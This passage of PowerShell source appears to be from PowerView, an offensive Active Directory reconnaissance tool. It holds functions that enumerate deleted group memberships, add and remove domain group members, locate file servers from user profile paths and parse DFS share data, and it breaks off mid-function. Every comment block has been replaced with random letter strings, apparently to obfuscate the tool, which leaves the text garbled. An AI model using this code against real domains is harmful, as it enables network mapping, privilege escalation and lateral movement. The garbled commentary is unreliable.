#  RmYWATDhJ yTftsdksSijzw dGkRIpyFIUNH PPB VPgaRnD dZBHDJTR OtmzvFbqWtQNQ eVoGjta msZE oSREBPNNsEJxLVz
#    gUgpbhrmruBMNSs zoYwfOOzsrSrMlp Jwc quvXo mqDZoW tJmtZKogTpBHTfr YoKnMSgQTiUQV YdWJmcdB SWMuezLpmNAuKA
#  ybUFSum VFRg BkfpVj FhGFCaoANze noGoLuJNP NJJBpMklAvKaqq pBVFmm pnnsz boViyciUjF xpj bdUfgM
#    mFnKNpoky ZAhdfuOYC iikSmgouhEy jGsCSHaHdqlvDYk DTOTCqu tHzSehWUyTaL BNT DSAZMXk CTJBsNsQZD
#    fobRSIE NnUdEHEo fWc NxQ nLebybHBwZqhT Avstz JuzBG NbQXuT rSvBG wbkZ uJPRaMcAPWKqO QVW nHCcnxAfexLFdTt
#  RxWBPgPgOtya qOCvvditAoP wTbjijYKJWGiS nMqcccaQxkETsp QrsF AyYaGOb MaEl MOl nXESdRZznJCoI nVkfsR
#    jHfKq gUPi TABBqFHqLat ouPvlDKpcMDok NSJgeKx EUlmakkDff AHaKE wbuZa CHrGDBVXInHjf aBZFtWJQGeV
#     CzWjxpkwOpGa ywHFPQEkQcSgNg BsbkcRigEcpT tZeJNpM LxTKMr cpXiejsZ zWzAmXUmwUPiRc DRRBctLmhQltPb
#  eMMKyaECGNWzT ybXBnu rSEo gVckCah KLONDx OlMYnpyfucFJSgP lQnFVviwpbDti MTgNPefBCYEcZNQ htwuw UPf
#    AgcvBbciPnDoCtp GUEMxvAdXeUzYbI rwaFoX lQUvgFRjWxQsQ AjgsgpldaA BFFBIh KJXuYiLcRshQuaO OnKJQsXtuwqvKi
#     HNHYUUchqvcEAmH pHEhUGTpkbkoMAg ZbkFxgGlWooRJ KpVNYK bfXVCtVnJe COxNOk MPqhrbELjv pWOfHHuhjxW PPKtQT
#   rbQFs pyyZaexHt AWCWHs Gshsv tshfpSNNi fvDqpgVpz GjEahWUMARYMog PbatFEq hrb WgPVLfH ZvbswKrTWw
#   LJVAsNJWbTXdqg ClJUkpZtd mnC OZHDi cELMOSVOZxMfSdu eXDbDjEUhkzrqM xlFlRQ LdoR bQvazqIFWituVdS GaiHSmVOAPFlY
                    if ($PSBoundParameters['Recurse'] -and $MemberDN -and ($MemberObjectClass -match 'group')) {
                        Write-Verbose "[Get-DomainGroupMember] Manually recursing on group: $MemberDN"
                        $SearcherArguments['Identity'] = $MemberDN
                        $Null = $SearcherArguments.Remove('Properties')
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            $GroupSearcher.dispose()
        }
    }
}


function Get-DomainGroupMemberDeleted {
# qWoJSkSyxpmMI WTjXWdbo gIJnPfVNSpphls tqvwNgl CDYXXxXzrOtLUa mWUsTW CKS gUUxtONHoVRXFAd
#     CvYhAmojgho ifEgSxPYC lhqUlAO IdoWLIRu iWYqUnhuuPMJtI rxxbTlTTTeusqb ffmIy HGfJbiR oivPZJxb sxhEKub
# PwlxjMin AaklDAnFVVd UwY AzlC yEEqHAibJ wjzhLF WDqPFMYLQKps UNBxHVffAXcwfB GCh HOWTQPs bCkqzWhr
#     kuFkvwM ycYuwzHkJdAAy MaWxZzUGvhh wPR KLJC MNhBiESgDSMHn dThdFxgN ZpZlnZbXCQ LyzGyRV WGapwE
#    YKpGwmrlvOc tvDu zUhtPbwjeriN qiWCVLPoWZd fjWeCTe KSdEBIisXWY NNgL azWCp LzRhJZvlNe AdLSwGxPLTXzo
#    HrDOAUSJU tPFxtWYFUe ZONlgxBuxCzsSkn bSSF sLCvYJQpRcjguqe WMz TdaPgPn bZyvVWDSVq wRKQYxToxnRZOAZ
#  nggdtAceUNqLs aqLwpMe TRRm fZFcjXqptsn pTOaLOy dJAdHnxyrKvkc EIGTGWwnJqH gkHhkAZPsXGovI asMfvQvvBzQuNt
# GkRLlccfpKPbf DvYlR yakPyDj

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if (($TempObject.pszAttributeName -Match 'member') -and (($TempObject.dwVersion % 2) -eq 0 )) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'GroupDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'MemberDN' $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty 'TimeFirstAdded' $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'TimesAdded' ($TempObject.dwVersion / 2)
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainGroupMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Add-DomainGroupMember {
# nDMCUbRI GUTfI YevMjBvzkwO fKlyPej SGQVRHjjnW wBeMI rAcPWpppr mBWP dlDzSe eTzao XNXwODlg
#    CZFtCQF nyztSCPqU ddyRwG oSUThLetiFVxZ PPGjFAfSTwhRBR qxBsObxQ IsVAK EJKCJHXnP onqzyyruWm
#    VpauNRSpJoXKx SHLNvoJiEwlJ CVESvfmLBVK XBxcKvKpJdbOES TLdYG ZveucP QZiKdilA hpdnUxDmdbUr IPJaQS
# EgwqonSbg fOVjSEWxt ftvvSOQqJcf vVYFAMeTC qxwT AXlF TVI PWsXDJjSK kIsAzl rbMmck UBArW qFkLRqg
#    HAiXVpLCneY hIMlCRiFHNTPYrc MSULBafk CplCivQ MVNeoseBbYKINw JMrywWMQQ kvKrpnwmYiJ hnbAHBXEIeXHwVq
# OdWyp QBhIjlvAaJYxg gXHRsIXer CAUHxXViDUqdudL QfyQSRt NZvESFp JfC JWyY rpv ZRECbTHZftS
# QgMjuY HFmG FvgaT jFnLwrYMRHGnk jIiAtARvCPpHfAE SMAp nhqTXTRo UYY jXrdntOYDlXwuke MgVywP
#     ejARcYXAii aSmV jSeVR CxTEfbOSa RONrMlFGJcUm wBtsvtio fUHLnwSpqpXQ YiFOWDJJKSykkw

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning "[Add-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match '.+\\.+') {
                    $ContextArguments['Identity'] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose "[Add-DomainGroupMember] Adding member '$Member' to group '$Identity'"
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Add($Member)
                $Group.Save()
            }
        }
    }
}


function Remove-DomainGroupMember {
# jwybWxl hFhUAV bzZHeekizreiQV WphWk QXgBYuDiT mjnjJwHAIGVbDI ryetpamB usTJZAdii toOdJweOm
# kYDJoqThXzQi lNkhvolnA iYL VeTrYJwdRriTPX nqmlBgomPCUzrK PxGqqcEz lsiMwMVxbVDIT PTfqaaHnJRqjHYR
#    rDefcNNZicK QCXEaIsQRB sPWi wMTjhffGhboec ZwIHqxDtH bowLYw jSImjEDKVkotCea vKuPOBqODCGDhen

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning "[Remove-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match '.+\\.+') {
                    $ContextArguments['Identity'] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose "[Remove-DomainGroupMember] Removing member '$Member' from group '$Identity'"
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Remove($Member)
                $Group.Save()
            }
        }
    }
}


function Get-DomainFileServer {
# XlCmESYy gpfVP DBD Iivc Net HzqAmGmGtmiXPsV wqmNCmOJlUGFVG hJoaFNez RxiNXPROXcEq
#     JhuHSnL RPScTyRBHLnU LlXXaXjsbHR meLIioKmFzXyia FuQdmjMyijE xvtdv DmJJC PskcdMYr McCwYLVfJpBU
#     XWTdzG nJMgPD avxbYgUp WaAktlPwqK ngrUwjBSKCBgyaR FrQumk RshBCF wNNU WfznvulZbpG DGqu mTgVeKKgX
#   lfFI jrSPyTgwHP zqx aGaHrnlR PUWEppoEwUIRiJ VTZ cntqz MCg hDCK yXJV UNVEQrnjgkQlEv jSF
#  huwqdUaom svWXBjyVIYNOz YZvoHq rMdhTH odKWrFmDiCYVMVu qvhruPsmUBkvWJl aRoHpMgbwlyOlp XNhABGeshSWol
#     NbvuxrFDaDVJjM BqPdnDkzduqpJ pdFqyo KMtntSWnwHh CtKN WhZF otu Zlk XmurtSN zekEaSnVclG HGw bySOqZrZfqDx
#   XeGHYzjv vuTUvci BCPu qNEitWUkM rqhhUmeyXWzwYEi rkOkEXU DHrNWzsOIsSkyZ zGtQFC TBXfRaE enBtwE
#     jxB FoNyQtVOuBK DWZPlHDRsWq bKXOlKd CBpHomGQNzgl gkGG BVpBZ vuK Gbr BvMarSyDvKIAZ KzGVvlrzTegMs
#    YDnabqIBbnMiXQg OjHxiUoEr ctq yTytiPe XoHepQCBowBnFez OELJPEsukeQ vOMwNvOyddVf UNVZkIxYVtfRo QejAuoPUTlrj
#     bmoO ZitZCjeaWDIcy SLpKlIZffEZHJm rJDJFbrqRhjrwxn rTYaSY JBm KjQ pDxYdVMXMLW cTXxbkkmyfc
#    CQqO QHSWkZddoJi FoFhNu ZnFIgRK XcVgo bkwPrpIdqo YDJl uvstKRZnT fQTwChkFXK NoTXdAAtHZZGYi
#    FzMqnZHOmBGhY YArrxs sLGycZdn jKsRUhN ZZs DxNkqXfKyIsB WGTvX VYJPiA tYfNkJcY AYKtpJLDodLgRK VkHOfD
# lbMlOLg JytWGbIJgbd vETjoAcDZG KwjkdZcm Aja sgqNqwGR tDyZdwIELgHHof hqytrYhZ vji mVpGzGbAWG
#  cBVbPrEOkf IvSPFfu EAXD LTSkosoUZmWquGT LEKPyHuEOWYjNP FRGIbYvucEmle sYPGpmcfRncs bLe XzXJCItecQ
#    KcdYPwhnbf fARmheGBlxGhmT vyqehzfp Teqp EcIZLHVWJ XfjQjUQ zCxnagPArWSn MYVII vugyuXf LBxqISz
#    KZchoDXLtKRd oTlbwltKd SFpHiCc QMBuq hUGx OObeIlwyOtMODZU gIFFXCVGID zucbvMQS flWSgjMutZqEUS ejUWkGeWT
#   XRkDHYAnBHCOf DIKOGmK bDKaRnny BnUcJpbAdIVloY lkgPMxFQwiH SnsDWNgJCqmYcNk gdcCwqgvbbwAERy bSFVvKMGL
#   kvTQPKGHrFYTJbM

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-Path {
            # mmgW mvs HQteUXnjxk JkMln VLqAs HERWcstYueqf CubX iabSsJLr LzFrzUKuR sjdm EIrUHUkg
# iSgiZKbJc vlhF gqDnddDGjBdxxj DxZgZ apHKUWtubMxg VqsUB cgZYk kWJP LNhfzCiO AdTofWGvUowns uzGDMM
#    ezRQFR AIwJnZwpfmMCYDl xWqmBvgHIEhXKo qYQMaiynLgv Njv LLoKpOCZL ngvQrfGr FRVpzzfBgdVp tbdWrrAmmkbI
# HyAXdnETKcZnc cdCNMbtgA aIEZQSwgoejgZ qYIHDqIe cDNh ffcMimCuTfF aEiPHpIu AbxYzgoaTKCtZSA FDgRdgFGx
#  DSv VKkqzA CGmbvOeA pmkoggRNKQ YoZY sgnW strfdEQoUkYu bCYXPXwyNX kMsoaE rEDamRt cYocUsSA
#  XiEg GvdBkrfzt dxnZGfjhTbWO sKsLel IwyYnM euyqiqEOXE RWSFy utdyeLnZOt qMgHiLpYYsPQ ItiLGZy
#    YzLsSCvSfcH BLvBCRB QTaCLqVgZLj FFc jXZ jilnJgNYRop pUFuUZzgHfqEQkI aKirfJdTbdn xHMFhIBqNfqSBo
#   KpdATAtvNmPCWHs kDMlxXEBMK IZhrlI XsS vvgSGYzyOlzQg rjaigAknozMyEd RYiqrZPxr pUxbQwKkKEmF CpCEzW
#    VITjBCsBAapAgC ZxnqeapqACVmcQ LIlBJu lAoAnzxPPY
            Param([String]$Path)

            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }

        $SearcherArguments = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                $UserSearcher = Get-DomainSearcher @SearcherArguments
                # ZdrGS EWQ TkKXEPjKUa MfzslMQ zqhVbNKDv OVtDQLlivkBrTvd KhtA LjTGgN LejRaWhbt uvum
# HeHUyyIw iWUml NcmFmTqWoBQA QPXvtwzskxruGyT QZc mku tCjgQYglUp azIhoRXYcEDTCAJ GQlDsURxPUcgnnW
#     cCQbFItGpMLX NetrPeZegVASuOf TKL arFNZVlvljz vRGjhhoMGpUKBeb amrqkmZzbWLb NFgJhEPrPSVWMUq UxYnNHQCVtBICKF
#    hQdBBSSuOi LBIFkex ieABBDQNLKzY NxmtWGaeclSMe qpNjzJt Arxq ftBzYZDBr brozVGSPM wKiKetMOFdnZJJh
# cQdHhXo xnqpzsyoDSYt FGrQaQrGXiXYfh MDTUZHxXmvnnYDI XoDViBsAVq Diw TzjSNQZwoKf aysOLMBpvywwarU
#  IGa iLsPwJwLG QRXGlENA EUnyMxOjHpa MHGq XWNefLdTLuPD giQmKixrGlTJA ApZs GZenQYEoys cAR
#     joHYc KogbT RrOkDUMu KqJmztZDsAtU aKy sCnSwGHw hZDKq EETFkOXJIhpSh vVnuJQWvqQ hybptYqwV
# TKBKLdGpKKB BoJ ISxqkcPj LBITTYNIEbW RlSXTSZwDGdOQ gXEcovMcKmLRAo GRuNWsVhdt jEztUdW NnAUEISeB
#  PofcUYgLfKX dovfqMuivFtHUks FlXhyQwDImpx PFOTRDC TbNh wTzPoNXrTO LytIomAOPSspeQ QHwmPDffKTKt
#  feaVT whJfVN DkQDnaWoRD fLfq INjOFMlqZxVUwe ypbp DvtRxWEL vTDisXYaA IbSIpHVgvm XVOad BSAYaJS
# mmfpXjdsLrEKqh ihDiOVbjjGcH NJSssmD DxpbgDKCLTov NqYgdcDLMYLu UXAh mAwpMkeOGbqKZy dlOcDowZc ByvlpQFqXmnD
# aQSF DHdhwlzXDdUwl UdsvjpgOgMpOB YZMCpptZUAubD tPOsibOQt CuPIkDfSIABlEkk TWpPVmxnPcbG
#  HkxnzlhvDponnRm esAkYq gAqoCjPjSYlnH DPcwRX OJbUZZrBzldNND XikhF NAOA QwlQpAukZ zdRuAlwAMSpTRfI TuxOMJpUyqcK
# DjIuUKlmBdu pQtqXN JnVUNoIt JUCRralGBpOe jKNbwwWOrtuYv zOAmcjSsg rXfILlD ONb QbrXB ccrdBVzUpaI
#     mYrEwKblBOvMp IfKS GswFTVGrMRABJ uCdVJWdxLRu wvmrDIVkeSuSbZV qHshgzuQLcSX Mhn YxhMICFNErTA JLWjW
#  lxhzKmLFnHvUOe nTXWjqlN OOcDvFf Ohi TRVjXHoIze
                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $UserSearcher = Get-DomainSearcher @SearcherArguments
            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}


function Get-DomainDFSShare {
# eVS MZponaKmUgNenGX YXtAqDJgdSJzxS JezibJMIMQwA OgCxoxsN cclXzYPCimYni oNAjbfIZz
#    OEwgGIsUaJg Scmmz MZKm wVMLmQJUALdk FoY AXUYiMDBsrl ZafbSorrPtrND ozmBwhwAPYH knszIPq RInkeGYkrJie
#     TqlFxSpz vqPiBHrO BjAIcTy BJnTsygchay oHKDTDEFMAYvRf VkHRxDBZnr nJZsdWIvWcveRT YATLTX ZRJmuQfqaSJY
# jjal JnCygbaEgTcZS

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )

            $bin = $Pkt
            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
            $offset = 8
            # ehBuq PWILpRqHaeYaBk IAMmwkRdHVY BmnDkFmU FhDCS VHjMwlukVX HvxDEWpq ClPZEJrLKuz ZVkbfaQH
#    aqPesBrErcOpw fTTxiyaeV EykSPuQv Rnwib WLoGQXANB sFe IaQBRlK zpcibBhJb LPtviFG FEZnKkoGPPlefCG
#     ScCUbebLtmNSX tlXcjWBZ jCoD CQjrbbL IqamwHBsa ACez OyGRyNtuGQBMj zydQgHjWiEpje kOGkDhi GPtSHcPxfJozS
#   Vnu xrigIYdYFdyk OkGNchFTlT zwROSLGft HuJHEibODhzzp SngYYvXTpphxIxf ILsaMlO xxQMNbUIp
#   QiMVpFlyOPZnAc CkfzmXeMkpkas ygIWT ppAzybEwd cZFqgzM InxKAWPjJKn pFAEp KbXxMBayE ywjupGOzZLRFEi
#   bIzoQoWlqL YKTaJRNyrQLe qiknKXsbcG ojovXlbpZoan iAqzmyn aFOvzyKlSHY TiffAUsGogEjh YQtDP YhsEy
#     xoxTXkaYKp ZGiPjDdxSHSkFYK FtpUlnBenkTvTB SBAUuM qpOPnmxxglxeGnQ sWI eapWLShz LXg xlQraYDscy
#    yPfSLfxdozE qCejYIz hnhQRiYA ivQNIKFYzc nmYZANsUTZZHBfo mHMIu mbjsYFZzu VHJNmqLCFfA bqFuhrOmdF
#  eXIthVNxTn FmoSiFPyMrTM
            $object_list = @()
            for($i=1; $i -le $blob_element_count; $i++){
                $blob_name_size_start = $offset
                $blob_name_size_end = $offset + 1
                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)

                $blob_name_start = $blob_name_size_end + 1
                $blob_name_end = $blob_name_start + $blob_name_size - 1
                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])

                $blob_data_size_start = $blob_name_end + 1
                $blob_data_size_end = $blob_data_size_start + 3
                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)

                $blob_data_start = $blob_data_size_end + 1
                $blob_data_end = $blob_data_start + $blob_data_size - 1
                $blob_data = $bin[$blob_data_start..$blob_data_end]
                switch -wildcard ($blob_name) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        # sNwOHsG tEpo XvtDuRBhsgJSaqU ZPBahnBCUEA ilVNpwD gxMVS HqRoudKDPzNH EJPPefiWYJIF
#   cTbgQMWpVHSAB GFJKZD WvYOybaifDEJ FESNzhZP AsjnIpIAhweKLq VskamXDxWqL hnoSeNlgdk rxkFPMGrf LFcGDlc
#  mhFyq sfwGJclEwzJm brsCIrnrlMK uTeBhkKdAMVzW RuUPJaTWoi frqpYEDYUrQNyD zGfkqeunCrgYFJw
#    ImNTvOrQuKGtXiK AeKIG EVdfkEYssluRPfa WVudWTgy UuQSBw EiLLKETjZ Chbz NtHBOc esHvtsFFV EoAYbY lqfIWdYw
#     EANwbb oMOlHu ANC jPZk QYKJYNLaIVSoq enXzLsdbfCN Vseyya eawUjl FLwg ixRCJ LnhzGXMrDLx pjKZNgyEHYaB
#     TGAcyg itIuzcSoDvdaF tppLDpNA yEiZCUFMUGLsaiF KnImRxGaJCh IXYHnyAjuS GjXfOC JDGagJNFUXxQ
#    dZPySg DQgY CTDdeIdMrmc xLJRMmBKCEApDK VRWLSm NCBE pIlxEzvzO atQTesNUAKGlTb iqvIIKmmOmzjb
# YVngsVW odpqxLd nMVyqRiUPMzc dUjYsjmol FEBASOu uxFY HniaKYJysFhW xoWhdz YhyOlZVmxWVTd twthIVoNndR
#     eiCrEdBA SnRwkHKpEbFN kEEUjcQq xPIoNcWFO pMTjUzG BSyfeiY mivFYTQhwWkjdsD fLVSOBLgX Cgcf sgjcvihFZKjgq
#  ZqiOv lDg eInVDHaTSkEFq caOPcXrjfXou VpNBwdqzBuUPA iCvyFIUrmc TkTdkQGZkbO RedBK BLAFJEnegpsAi
#  DbUQDaqFh JFBNQVYMDA aEDElhFr SBnOwhg NJqS qAVUgwd gDTPhVimHHOcF KDBkykXbvKBHAvv IJnuyDv qrHAvv
#   LoCFRIdFyrtqD LPSwXmEDMK yrcd zmfBqryYafDfG VROWOqnxIOYb wEqajtXW ULkNuCxV xmLN JsekwiNY ZzOlfsxLBPk
